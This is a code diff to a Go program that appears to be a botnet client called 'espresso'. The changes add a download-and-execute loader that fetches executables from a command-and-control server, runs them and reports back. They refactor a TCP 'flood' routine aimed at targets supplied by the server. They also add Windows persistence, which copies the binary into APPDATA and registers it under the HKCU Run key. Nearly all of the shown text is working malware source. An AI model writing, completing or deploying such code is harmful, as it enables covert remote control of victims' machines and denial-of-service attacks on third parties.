@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"log"
 	random "math/rand"
 	"net"
 	"net/http"
@@ -19,6 +20,8 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 type Creds struct {
@@ -356,22 +359,29 @@ func loadFile(apiURL string, sessionKey string, id string, token string, fileNam
 	resp, err := client.Do(req)
 
 	if err == nil {
-
+		output, _ := os.Create(fileName)
+		defer output.Close()
 		defer resp.Body.Close()
+		io.Copy(output, resp.Body)
 
-		out, _ := os.Create(fileName)
+		currentDir, _ := os.Getwd()
+		Exec := exec.Command("start " + currentDir + "\\" + fileName)
+		err = Exec.Start()
 
-		defer out.Close()
-		io.Copy(out, resp.Body)
-
-		Exec := exec.Command(fileName)
-		Exec.Run()
+		if err != nil {
+			fmt.Println(err)
+		}
 
 		requestBody, _ := json.Marshal(map[string]string{
 			"": "",
 		})
 
-		http.Post(apiURL+"/loadcheck/"+id+"/"+token, "application/json", bytes.NewBuffer(requestBody))
+		req, _ := http.NewRequest("POST", apiURL+"/loadcheck/"+id+"/"+token, bytes.NewBuffer(requestBody))
+
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", "espresso")
+
+		client.Do(req)
 
 		os.Remove(fileName)
 
@@ -483,45 +493,74 @@ func bootRoutine(id string, token string, endTime time.Time, bootInstructions []
 			break
 		}
 
-		conn, _ := net.Dial("tcp", bootInstructions[1]+":"+bootInstructions[2])
-		flood(conn)
+		flood(bootInstructions[1], bootInstructions[2])
 	}
 }
 
-func randomString(strlen int, icint bool) string {
-	if icint {
-		random.Seed(time.Now().UTC().UnixNano())
-		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
-		result := make([]byte, strlen)
-		for i := 0; i < strlen; i++ {
-			result[i] = chars[random.Intn(len(chars))]
-		}
-		return string(result)
-	}
-	random.Seed(time.Now().UTC().UnixNano())
-	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
-	result := make([]byte, strlen)
-	for i := 0; i < strlen; i++ {
-		result[i] = chars[random.Intn(len(chars))]
-	}
-	return string(result)
-}
-
-func flood(connection net.Conn) {
+func flood(target string, port string) {
+	connection, _ := net.Dial("tcp", target+":"+port)
 	fmt.Println(0)
 	random.Seed(time.Now().UTC().UnixNano())
-	fmt.Fprintf(connection, randomString(random.Intn(256), true))
+	connection.Write([]byte("test"))
 	connection.Close()
 }
 
+// func amAdmin() bool {
+// 	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+// 	return err == nil
+// }
+
+func addRegKey(regLocation registry.Key, regPath string, key string, value string) bool {
+	k, err := registry.OpenKey(regLocation, regPath, registry.QUERY_VALUE|registry.SET_VALUE)
+	
+	if err != nil {
+		log.Fatal(err)
+		return false
+	}
+
+	if err := k.SetStringValue(key, value); err != nil {
+		log.Fatal(err)
+		return false
+	}
+
+	if err := k.Close(); err != nil {
+		log.Fatal(err)
+		return true
+	}
+	
+	return true
+}
+
+func persistency() {
+	goApp, _ := os.Executable()
+	src, _ := os.Open(goApp)
+
+	defer src.Close()
+
+	var fileToDestination string = os.Getenv("APPDATA") + "\\espresso.exe"
+
+	dest, _ := os.Create(fileToDestination)
+
+	defer dest.Close()
+
+	io.Copy(dest, src)
+
+	var userLevelKey string = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+	addRegKey(registry.CURRENT_USER, userLevelKey, "espresso", fileToDestination)
+}
+
 func main() {
-	var fileKey string = "skdnfhtjgrwnfghserfhiotfdsengdrm" // Hardcoded key for config and boot file encryption
-	var bootFilePath string = "boot.txt"                    // This file keeps an id that tracks what boot instruction the client is executing
-	var configPath string = "config.txt"                    // This is where the client's credidentials are stored
-	var tempLoadFileName string = "temp.exe"                // This is the temporary file use for downloading and running executables
-	var apiURL string = "http://127.0.0.1:5332"             // The server's location
+	var appDataFolder string = os.Getenv("APPDATA")
+
+	var fileKey string = "skdnfhtjgrwnfghserfhiotfdsengdrm"    // 32 char hardcoded key for config and boot file encryption
+	var bootFilePath string = appDataFolder + "\\boot.txt"     // This file keeps an id that tracks what boot instruction the client is executing
+	var configPath string = appDataFolder + "\\config.txt"     // This is where the client's credidentials are stored
+	var tempLoadFileName string = appDataFolder + "\\temp.exe" // This is the temporary file use for downloading and running executables
+	var apiURL string = "http://127.0.0.1:5332"                // The server's location
 
 	var apiConnection bool = checkConnection(apiURL)
+
+	persistency()
 
 	if apiConnection {
 		var configFileExists bool = checkFile(configPath)
